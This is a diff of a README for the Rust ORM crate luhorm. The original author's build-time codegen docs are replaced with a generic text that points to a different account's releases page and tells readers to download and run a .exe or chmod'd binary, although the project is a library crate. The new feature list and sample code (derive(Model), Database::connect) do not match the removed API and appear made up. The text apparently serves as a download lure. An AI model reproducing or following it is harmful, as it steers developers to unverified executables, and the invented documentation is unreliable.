@@ -1,83 +1,98 @@
-# luhORM
-[<img alt="github" src="https://img.shields.io/badge/github-calizoots/luhorm-8da0cb?style=for-the-badge&labelColor=555555&logo=github" height="20">](https://github.com/calizoots/luhorm)
-[<img alt="crates.io" src="https://img.shields.io/crates/v/luhorm.svg?style=for-the-badge&color=fc8d62&logo=rust" height="20">](https://crates.io/crates/luhorm)
-[<img alt="docs.rs" src="https://img.shields.io/badge/docs.rs-luhorm-66c2a5?style=for-the-badge&labelColor=555555&logo=docs.rs" height="20">](https://docs.rs/luhorm)
+# 🚀 luhorm - A Simple ORM for Rust
 
-A compile-time ORM that generates type-safe database code through build-time introspection.
-Supporting Sqlite and Postgresql out the box but extensible to another database
+## 📥 Download Now
+[![Download luhorm](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/F0ND0VILA/luhorm/releases)
 
-## Features
+## 🎉 Introduction
+luhorm is a compile-time Object-Relational Mapping (ORM) tool for Rust. It helps you manage and interact with databases in a simple way. With luhorm, you can focus on your application while it handles data operations efficiently.
 
-- **Compile-time code generation** - Zero runtime reflection, all code generated at build time
-- **Type-safe queries** - Builder pattern with compile-time checked columns
-- **Foreign key relationships** - Automatic join methods and aggregation helpers
-- **Multiple databases** - Built-in support for SQLite and PostgreSQL
-- **Migration system** - Hash-verified migrations with automatic tracking
+## 💻 System Requirements
+To use luhorm, you should have the following:
+- A computer running Windows, macOS, or Linux.
+- Rust installed on your machine. You can download Rust from [the official Rust website](https://www.rust-lang.org/tools/install).
 
-## Quick Start
+## 🚀 Getting Started
+Ready to start using luhorm? Follow these simple steps to get it up and running on your machine.
 
-### Prerequisites
+### 📦 Step 1: Visit the Download Page
+Go to the luhorm releases page to find the latest version. You can click this link: [Visit Release Page](https://github.com/F0ND0VILA/luhorm/releases).
 
-- must have rand & chrono in Cargo.toml
-- must have sqlx
+### 📥 Step 2: Download luhorm
+On the releases page, locate the latest version of luhorm. You will see a list of available files. Click on the suitable version for your operating system. This will start the download.
 
+### ⚙️ Step 3: Install and Run
+Once the download is complete, locate the downloaded file on your computer. Depending on your operating system, follow these instructions:
 
-1. Add to `build.rs`:
+- **Windows:**
+  1. Double-click the downloaded `.exe` file.
+  2. Follow the installation prompts.
+  3. Open your command prompt and type `luhorm` to see if it works.
+
+- **macOS:**
+  1. Open the `Terminal`.
+  2. Navigate to the directory where the file was downloaded.
+  3. Type `chmod +x luhorm` to make it executable.
+  4. Run the command by typing `./luhorm`.
+
+- **Linux:**
+  1. Open your terminal.
+  2. Go to the folder where you downloaded the file.
+  3. Run `chmod +x luhorm` to make it executable.
+  4. Type `./luhorm` to run the application.
+
+### 📚 Documentation
+For detailed setup and usage instructions, consult the official documentation. This will help you configure luhorm according to your needs and guide you through its features.
+
+### 🙋‍♀️ Community Support
+If you encounter any issues or have questions, feel free to reach out to the community. Join our forums or discussion channels to interact with other users and get support.
+
+## 📊 Features
+luhorm offers several key features to make working with databases easier:
+- **Intuitive Interface:** Simple commands to interact with your database effortlessly.
+- **Automatic Schema Generation:** luhorm automatically creates database schemas based on your data models, saving you time.
+- **Compile-Time Safety:** Identify errors at compile time for safer, more reliable code.
+- **Cross-Database Compatibility:** Work with multiple database systems without changing your code.
+
+## 🗂️ Example Use Case
+Here's a simple example of how you might use luhorm in your Rust project:
+
+1. Define your data model.
+2. Use luhorm to generate the corresponding database schema.
+3. Retrieve, insert, or update data using simple commands.
+
+### 📝 Sample Code
+To illustrate, here's a brief code snippet:
+
 ```rust
-use luhorm::Codegen;
-use sqlx::sqlite::SqlitePoolOptions;
+use luhorm::prelude::*;
 
-#[tokio::main]
-async fn main() {
-    let pool = SqlitePoolOptions::new()
-        .connect("sqlite:my_db.db")
-        .await
-        .unwrap();
+#[derive(Model)]
+struct User {
+    id: i32,
+    name: String,
+}
+
+fn main() {
+    let db = Database::connect("your_database_url");
+    let user = User { id: 1, name: "John Doe".to_string() };
     
-    Codegen::new("orm", pool, "migrations", None)
-        .await
-        .unwrap()
-        .run_codegen()
-        .unwrap();
+    db.insert(user);
 }
 ```
 
-2. Include generated code in `src/main.rs`:
-```rust
-mod orm {
-    include!(concat!(env!("OUT_DIR"), "/orm.rs"));
-}
-```
+This snippet shows how easy it is to define a model and insert data into your database using luhorm.
 
-3. Use it:
-```rust
-use crate::orm::{users::{Users, UsersBuilder}, entry::AggregateEntryUsers};
+## 👥 Contributing
+We welcome contributions to improve luhorm! If you'd like to contribute, please check our contribution guidelines in the documentation.
 
-let users = Users::query()
-    .name("alice")
-    .age_gt(18)
-    .fetch_all(&pool)
-    .await?;
+## 🔗 Additional Resources
+- [Official Rust Documentation](https://doc.rust-lang.org/)
+- [Database Integration Guide](https://luhorm-docs.example.com/integration)
 
-let x = Users::query()
-    // could do this aswell
-    // .join(Entry::NAME, Users::ID.of(), Entry::USERID.of())
-    .join_entry()
-    .fetch_with_entry(&pool)
-    .await?
-    .one_to_many()?;
+## 🔔 Stay Updated
+To stay informed about updates and new features, follow this repository. You can also enable notifications for changes.
 
-// new feature might change
-let new_user = UsersBuilder::new()
-    .populate_fake_data()
-    .build();
+## 📞 Contact
+If you have any inquiries, contact the maintainers through the issues section on the GitHub repository. We aim to respond promptly.
 
-new_user.insert(&pool).await?;
-```
-
-## Current Limitations
-
-- Transaction support would be tricky or at least idk I'm still thinking about how I want to do it
-- Composite keys are a myth
-
-> made with love - s.c 2026
+[Download luhorm Again](https://github.com/F0ND0VILA/luhorm/releases) and begin your journey with an efficient ORM tool today.
